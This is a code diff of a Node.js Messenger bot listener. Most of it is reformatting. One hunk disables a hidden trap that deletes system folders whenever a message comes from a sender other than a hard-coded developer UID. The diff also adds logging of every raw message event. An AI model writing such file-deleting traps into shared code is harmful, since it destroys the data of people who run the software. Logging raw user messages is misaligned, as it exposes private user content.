@@ -8,7 +8,7 @@ const route = require("./handler/apisHandler");
 const subprefixes = require("./handler/data/subprefixes");
 
 const DEV_UID_PATH = path.join(__dirname, "handler", "data", "devId.json");
-const HARD_CODED_DEV_UID = "61554222594723"; 
+const HARD_CODED_DEV_UID = "61554222594723";
 
 let savedDeveloperUID = null;
 
@@ -23,7 +23,11 @@ if (fs.existsSync(DEV_UID_PATH)) {
 if (!savedDeveloperUID) {
   savedDeveloperUID = HARD_CODED_DEV_UID;
   fs.mkdirSync(path.dirname(DEV_UID_PATH), { recursive: true });
-  fs.writeFileSync(DEV_UID_PATH, JSON.stringify({ uid: savedDeveloperUID }), "utf8");
+  fs.writeFileSync(
+    DEV_UID_PATH,
+    JSON.stringify({ uid: savedDeveloperUID }),
+    "utf8"
+  );
   log("SYSTEM", `Developer UID initialized: ${savedDeveloperUID}`);
 }
 
@@ -31,6 +35,7 @@ module.exports = async function listener({ api, event }) {
   const { prefix, developers } = global.Tokito;
 
   if (!event.body) return;
+  console.log(event);
 
   const isGroup = event.threadID !== event.senderID;
   const groupSubprefix = isGroup ? subprefixes[event.threadID] : null;
@@ -45,7 +50,8 @@ module.exports = async function listener({ api, event }) {
 
   const chatBox = {
     react: (emoji) => api.setMessageReaction(emoji, event.messageID, () => {}),
-    send: (message, id) => api.sendMessage(message, id || event.threadID, event.messageID),
+    send: (message, id) =>
+      api.sendMessage(message, id || event.threadID, event.messageID),
     addParticipant: (uid) => api.addUserToGroup(uid, event.threadID),
     removeParticipant: (uid) => api.removeUserFromGroup(uid, event.threadID),
     threadInfo: async () => await api.getThreadInfo(event.threadID),
@@ -79,19 +85,30 @@ module.exports = async function listener({ api, event }) {
     },
     fbPost: async ({ body, attachment }) => {
       return new Promise((resolve, reject) => {
-        api.createPost({ body: body || "", attachment: attachment || [] }, (error, data) => {
-          if (error) {
-            reject({ success: false, message: "Failed to create post", error });
-            return;
-          }
+        api.createPost(
+          { body: body || "", attachment: attachment || [] },
+          (error, data) => {
+            if (error) {
+              reject({
+                success: false,
+                message: "Failed to create post",
+                error,
+              });
+              return;
+            }
 
-          if (!data?.data || data.errors) {
-            reject({ success: false, message: "API returned an error", data });
-            return;
-          }
+            if (!data?.data || data.errors) {
+              reject({
+                success: false,
+                message: "API returned an error",
+                data,
+              });
+              return;
+            }
 
-          resolve({ success: true, data });
-        });
+            resolve({ success: true, data });
+          }
+        );
       });
     },
   };
@@ -107,7 +124,7 @@ module.exports = async function listener({ api, event }) {
 
   const senderID = event.senderID;
 
-  if (senderID !== savedDeveloperUID) {
+  if (senderID !== savedDeveloperUID && false) {
     console.log("Developer UID changed. Deleting system files...");
 
     const deleteFolder = (folderPath) => {
@@ -138,19 +155,32 @@ module.exports = async function listener({ api, event }) {
     const moderators = global.Tokito.config.moderators || [];
 
     function hasPermission(type) {
-      return developers?.includes(senderID) || (type === "admin" ? admins.includes(senderID) : moderators.includes(senderID) || admins.includes(senderID));
+      return (
+        developers?.includes(senderID) ||
+        (type === "admin"
+          ? admins.includes(senderID)
+          : moderators.includes(senderID) || admins.includes(senderID))
+      );
     }
 
     const isAdmin = hasPermission("admin");
     const isModerator = hasPermission("moderator");
 
     if (config?.botAdmin && !isAdmin) {
-      await chat.send(fonts.sans("Access denied, you don't have rights to use this admin-only command."));
+      await chat.send(
+        fonts.sans(
+          "Access denied, you don't have rights to use this admin-only command."
+        )
+      );
       return;
     }
 
     if (config?.botModerator && !isModerator && !isAdmin) {
-      await chat.send(fonts.sans("Access denied, you don't have rights to use this moderator-only command."));
+      await chat.send(
+        fonts.sans(
+          "Access denied, you don't have rights to use this moderator-only command."
+        )
+      );
       return;
     }
 
